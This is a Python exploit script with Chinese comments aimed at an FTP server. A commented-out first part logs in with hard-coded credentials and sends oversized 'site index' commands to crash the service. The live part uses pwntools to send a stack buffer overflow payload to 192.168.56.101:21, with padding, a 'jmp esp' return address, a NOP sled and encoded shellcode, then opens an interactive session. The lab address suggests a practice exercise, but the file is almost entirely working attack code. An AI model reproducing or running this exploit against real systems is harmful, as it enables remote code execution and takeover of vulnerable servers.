'''import socket,sys
def ftp(ip,port,user,passwd):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)		#建立socket连接
    try:
        connect=s.connect((ip,port))		#连接主机
        print('[+] Connected!')
    except:
        print('[!] Connected failed!')
        exit(0)
    print(s.recv(1024))
    s.send('USER %s\r\n'%user)			#发送用户名
    print(s.recv(1024))
    s.send('PASS %s\r\n'%passwd)		#发送密码
    print(s.recv(1024))
    print("[+] Sending payload...")
    s.send('site index '+'a'*272*1+'\r\n')	#发送脏数据
    s.send('site index '+'a'*272*2+'\r\n')	#发送脏数据(发送一次无法实现服务器崩溃)
    try:
        print(s.recv(1024))
        print('failed')					#出现异常说明可能出现了漏洞
    except:
        print('succeed')
    s.close()

if __name__ == '__main__':
    ftp('127.0.0.1',21,'Levi','root')
'''
from pwn import *

p = remote('192.168.56.101', 21)

shellcode = (
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x49\x49\x51\x5a\x6a\x42"
"\x58\x50\x30\x41\x31\x42\x41\x6b\x41\x41\x52\x32\x41\x42\x41\x32"
"\x42\x41\x30\x42\x41\x58\x50\x38\x41\x42\x75\x38\x69\x79\x6c\x4a"
"\x48\x67\x34\x47\x70\x77\x70\x53\x30\x6e\x6b\x67\x35\x45\x6c\x4c"
"\x4b\x73\x4c\x74\x45\x31\x68\x54\x41\x68\x6f\x6c\x4b\x70\x4f\x57"
"\x68\x6e\x6b\x71\x4f\x45\x70\x65\x51\x5a\x4b\x67\x39\x4c\x4b\x50"
"\x34\x4c\x4b\x77\x71\x68\x6e\x75\x61\x4b\x70\x4e\x79\x6e\x4c\x4d"
"\x54\x4b\x70\x72\x54\x65\x57\x69\x51\x49\x5a\x46\x6d\x37\x71\x6f"
"\x32\x4a\x4b\x58\x74\x77\x4b\x41\x44\x44\x64\x35\x54\x72\x55\x7a"
"\x45\x6c\x4b\x53\x6f\x51\x34\x37\x71\x48\x6b\x51\x76\x4c\x4b\x76"
"\x6c\x50\x4b\x6e\x6b\x71\x4f\x67\x6c\x37\x71\x68\x6b\x4c\x4b\x65"
"\x4c\x4c\x4b\x64\x41\x58\x6b\x4b\x39\x53\x6c\x75\x74\x46\x64\x78"
"\x43\x74\x71\x49\x50\x30\x64\x6e\x6b\x43\x70\x44\x70\x4c\x45\x4f"
"\x30\x41\x68\x44\x4c\x4e\x6b\x63\x70\x44\x4c\x6e\x6b\x30\x70\x65"
"\x4c\x4e\x4d\x6c\x4b\x30\x68\x75\x58\x7a\x4b\x35\x59\x4c\x4b\x4d"
"\x50\x58\x30\x37\x70\x47\x70\x77\x70\x6c\x4b\x65\x38\x57\x4c\x31"
"\x4f\x66\x51\x48\x76\x65\x30\x70\x56\x4d\x59\x4a\x58\x6e\x63\x69"
"\x50\x31\x6b\x76\x30\x55\x38\x5a\x50\x4e\x6a\x36\x64\x63\x6f\x61"
"\x78\x6a\x38\x4b\x4e\x6c\x4a\x54\x4e\x76\x37\x6b\x4f\x4b\x57\x70"
"\x63\x51\x71\x32\x4c\x52\x43\x37\x70\x42")



# 0x77d29353 -> jmp esp
payload = 'a' * (0xfc - 1) + "\x53\x93\xd2\x77" + "\x90" * 16 + shellcode

p.sendline(payload)
p.interactive()
